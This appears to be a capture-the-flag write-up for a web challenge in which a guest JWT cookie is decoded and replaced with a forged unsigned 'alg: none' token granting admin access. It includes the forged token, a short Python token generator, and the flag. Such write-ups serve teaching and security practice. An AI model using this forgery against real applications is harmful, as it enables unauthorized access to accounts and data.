---
title: Discord Nitro
date: 2026-07-06
tags:
- web
- LYKNCTF
---

- **Challenge:** Discord Nitro
- **Category:** Web
- **Flag:** `LYKNCTF{659033ed61314498b855fa4df163184d}`

---

## My initial read / first impressions

The challenge is called **Discord Nitro**, and the description is just:

```text
Free Discord Nitro
```

Opening the website gives a pretty normal login page. It also directly gives us a demo account:

```text
guest / guest
```

So the first thing I did was log in with those credentials instead of trying to brute-force or bypass the login form.

After logging in, the home page says:

```text
Hello, guest!
You are logged in with role: user
Your session is stored in the token cookie (a JWT).
```

There is also a link to `/admin`, but visiting it as the guest user does not give us access.

At this point, the app is basically telling us exactly where to look: the JWT stored in the `token` cookie.

## Inspecting the JWT

I opened the browser developer tools, went to the Application tab, and copied the `token` cookie:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.dCdGtxl1AM3Uk65cK67xMPkvOdoCmYZ2YAXd4-SykTs
```

A JWT has three base64url-encoded parts:

```text
header.payload.signature
```

Decoding the header gives:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The payload is:

```json
{
  "user": "guest",
  "role": "user"
}
```

So the authorization check is clearly based on the values inside the JWT. The goal is to change the user and role to `admin`.

Normally, changing the payload would invalidate the signature, and we would need the server's HS256 secret to create a valid replacement signature.

However, JWT implementations can be vulnerable if they accept the `none` algorithm. In that case, the token claims that no signature is required, and the server trusts an unsigned token.

## The Vulnerability

The application accepts JWTs with this header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

This is a JWT algorithm confusion / unsigned token vulnerability.

Instead of requiring a valid HMAC signature, the server accepts a token whose algorithm is `none`. That lets us completely replace the payload and leave the signature empty.

The forged payload is:

```json
{
  "user": "admin",
  "role": "admin"
}
```

The two base64url-encoded sections are:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

and:

```text
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ
```

Because `alg` is set to `none`, the signature is empty. A JWT still has three sections, so the final period has to remain at the end.

The complete forged token is:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

## Exploitation

I replaced the original `token` cookie in the browser with the forged token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

Then I visited:

```text
/admin
```

The server accepted the unsigned token, treated me as an administrator, and returned the admin panel:

```text
Welcome, administrator! Here is your reward:
LYKNCTF{659033ed61314498b855fa4df163184d}
```

It also included an actual Discord Nitro gift link, which is a pretty funny reward for a JWT challenge.

## Generating the Token

The token can also be generated with a tiny Python script:

```python
import base64
import json


def b64url(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


header = {
    "alg": "none",
    "typ": "JWT",
}

payload = {
    "user": "admin",
    "role": "admin",
}

encoded_header = b64url(json.dumps(header, separators=(",", ":")).encode())
encoded_payload = b64url(json.dumps(payload, separators=(",", ":")).encode())

# The signature is empty, but the final period is still required.
token = f"{encoded_header}.{encoded_payload}."
print(token)
```

Running it prints:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

## Flag

```text
LYKNCTF{659033ed61314498b855fa4df163184d}
```
